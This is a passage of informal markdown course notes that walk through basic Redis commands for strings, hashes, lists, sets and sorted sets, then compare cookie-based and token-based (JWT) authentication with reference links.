DEL name

-- Expire
SET session "Jenny"
EXPIRE session 10
GET session

SET counter 1000
INCRBY counter 33
DECR counter
GET counter
```

### 324. Redis Data Types

- Strings
- Hashes
- Lists
- Sets
- Sorted sets

```sh
# Multiple set/get strings
MSET a 2 b 5
GET a
GET b
MGET a b
```

### 325. Redis Hashes

```sh
HMSET user id 45 name "Johnny"
HGET user id
HGET user name
HGETALL user
```

### 326. Redis Lists

In Redix, List (Linked List). \
insertiIon is very fast, but searching is not fast.\
Sorted Set is faster for getting or searching

```sh
# Push
LPUSH ourlist 10
RPUSH ourlist "hellow"
LRANGE ourlist 0 1
# 1) "10"
# 2) "hellow"
LPUSH ourlist 55
LRANGE ourlist 0 2

# POP
RPOP ourlist
LRANGE ourlist 0 2
```

### 327. Redis Sets + Sorted Sets

```sh
SADD ourset 1 2 3 4 5
SMEMBERS ourset
SADD ourset 1 2 3
SMEMBERS ourset
# the same result

# IS MEMBER
SISMEMBER ourset 5
SISMEMBER ourset 20

# SORTED SET
ZADD team 50 "Wizards"
ZADD team 40 "Cavaliers"
ZRANGE team 0 1
ZADD team 1 "Bolts"
ZRANGE team 0 2
# All sorted
# 1) "Bolts"
# 2) "Cavaliers"
# 3) "Wizards"
ZRANK team "Wizards"
```

</details>

## Section 13: Sessions JWT

<details open>
  <summary>Click to Contract/Expend</summary>

### 329. Section Overview

JWT : JSON Web Token

### 330. Cookies vs Tokens

1. Traditional Cookie-Based Auth
   - Set-Cookie: session=...
   - Both browser and backend need to store Session information.
2. Modern Token-Based Auth
   - token : ...JWT in \*Local storage, but can be stored in Session storage or a cookie in the browser
   - Backend doesn't need to store session information
   - Stateless
   - It can be access from many API servers easily
   - It can serve browser and IOS/Android as well
   - Cons: delevery data could be bigger than simple cookie

- [Cookies vs. Tokens: The Definitive Guide - Dzone](https://dzone.com/articles/cookies-vs-tokens-the-definitive-guide)
- [Token Authentication vs. Cookies - Stackoverflow](https://stackoverflow.com/questions/17000835/token-authentication-vs-cookies)
- [Why JWTs Suck as Session Tokens - scotch.io](https://scotch.io/bar-talk/why-jwts-suck-as-session-tokens)

### 333. JWT

- [jsonwebtoken - Github](https://github.com/auth0/node-jsonwebtoken)
- [JWT.io](https://jwt.io/)

</details>

# Next Step

- [Awesome Google Web Fundamentals](https://developers.google.com/web/fundamentals)
- Review Performance and digest them again
- Use Vercel and Serverless
